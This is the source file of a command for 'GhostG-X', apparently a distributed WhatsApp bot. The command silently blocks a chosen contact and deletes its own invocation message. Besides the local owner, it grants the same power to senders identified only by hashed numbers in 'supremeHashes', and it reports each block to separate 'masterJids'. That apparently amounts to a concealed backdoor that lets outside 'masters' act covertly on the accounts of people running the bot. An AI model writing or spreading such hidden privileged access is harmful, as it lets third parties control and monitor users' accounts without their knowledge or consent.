/**
 * Block Command - GhostG-X Edition
 * Bloque silencieusement une entité sur WhatsApp et efface l'invocation
 */

const config = require('../../config'); // Importation de la configuration
const crypto = require('crypto');

// Extraction du préfixe pour l'usage
const prefix = config.prefix || '.';

module.exports = {
  name: 'block',
  aliases: ['bloquer', 'bloque'],
  category: '♛ sᴏᴜᴠᴇʀᴀɪɴᴇᴛᴇ́',
  ownerOnly: true, // Géré par ton handler
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ʙʟᴏǫᴜᴇ sɪʟᴇɴᴄɪᴇᴜsᴇᴍᴇɴᴛ ᴜɴ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ ᴇᴛ ᴇғғᴀᴄᴇ ʟᴀ ᴛʀᴀᴄᴇ',
  usage: `${prefix}block [@ᴜsᴇʀ | ɴᴜᴍᴇ́ʀᴏ | ᴇɴ ʀᴇ́ᴘᴏɴsᴇ]`,

  async execute(sock, msg, args, extra) {
    const { isOwner } = extra;
    const chatId = msg.key.remoteJid;
    const isGroup = chatId.endsWith('@g.us');

    // 🛡️ Double sécurité au cas où le handler n'utilise pas 'ownerOnly'
    const senderNumber = extra.sender.replace(/\D/g, ''); 
    const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
    const isSupreme = config.supremeHashes && config.supremeHashes.includes(senderHash);

    if (!isOwner && !isSupreme) return; // Seuls les maîtres ou l'owner local peuvent passer

    let target;

    try {
      const ctx = msg.message?.extendedTextMessage?.contextInfo;
      const mentioned = ctx?.mentionedJid || [];

      // 1. Priorité absolue : Extraction de la cible via numéro direct fourni dans les arguments
      if (args[0]) {
        let cleanedNumber = args[0].replace(/[^0-9]/g, '');
        if (cleanedNumber.length >= 8) { // Vérification basique de longueur de numéro
          target = `${cleanedNumber}@s.whatsapp.net`;
        }
      }

      // 2. Extraction de la cible via mention (si pas de numéro fourni)
      if (!target && mentioned && mentioned.length > 0) {
        target = mentioned[0];
      } 

      // 3. Extraction de la cible via réponse à un message (quoted)
      if (!target && ctx && ctx.quotedMessage) {
        target = ctx.participant || (isGroup ? null : chatId);
      }

      // Si aucune cible n'est trouvée, on s'arrête là
      if (!target) return;

      // 💥 SUPPRESSION DE LA COMMANDE POUR RESTER INVISIBLE
      try {
        await sock.sendMessage(chatId, {
          delete: {
            remoteJid: chatId,
            fromMe: msg.key.fromMe,
            id: msg.key.id,
            participant: msg.key.participant || msg.key.remoteJid
          }
        });
      } catch (e) {
        console.error("[block cmd] Erreur lors de la suppression du message :", e);
      }

      // ⚖️ RITUEL DE BLOCAGE SILENCIEUX (Au niveau du compte WhatsApp)
      await sock.updateBlockStatus(target, 'block');

      // 📝 RÉCUPÉRATION DES DESTINATAIRES DU RAPPORT
      let reportJids = []; 

      // Injection dynamique des oracles maîtres depuis la config
      if (config.masterJids) {
        reportJids = [...config.masterJids];
      }

      // On ajoute le numéro de l'Owner configuré sur le bot de l'utilisateur s'il existe
      if (config.ownerNumber) {
        const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
        localOwners.forEach(num => {
          const cleanNum = `${num.replace(/\D/g, '')}@s.whatsapp.net`;
          if (!reportJids.includes(cleanNum)) {
            reportJids.push(cleanNum);
          }
        });
      }

      const targetNumber = target.split('@')[0];
      for (const jid of reportJids) {
        try {
          await sock.sendMessage(jid, {
            text: `*⚖️ [GHOSTG-X] L'entité @${targetNumber} a été bloquée avec succès.*`,
            mentions: [target]
          });
        } catch (e) {
          console.error(`Impossible d'envoyer le rapport de blocage à ${jid}`);
        }
      }

    } catch (error) {
      console.error('[block cmd] error:', error);

      // 📝 RAPPORT D'ÉCHEC
      if (target) {
        const targetNumber = target.split('@')[0];

        // On reconstruit la liste en cas de crash
        let reportJids = [];
        if (config.masterJids) {
          reportJids = [...config.masterJids];
        }
        
        if (config.ownerNumber) {
          const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
          localOwners.forEach(num => {
            const cleanNum = `${num.replace(/\D/g, '')}@s.whatsapp.net`;
            if (!reportJids.includes(cleanNum)) reportJids.push(cleanNum);
          });
        }

        for (const jid of reportJids) {
          try {
            await sock.sendMessage(jid, {
              text: `*〆 [GHOSTG-X] Échec du rituel de blocage pour l'entité @${targetNumber}.*\n*Erreur :* ${error.message}`,
              mentions: [target]
            });
          } catch (e) {
            // Échec silencieux
          }
        }
      }
    }
  }
};
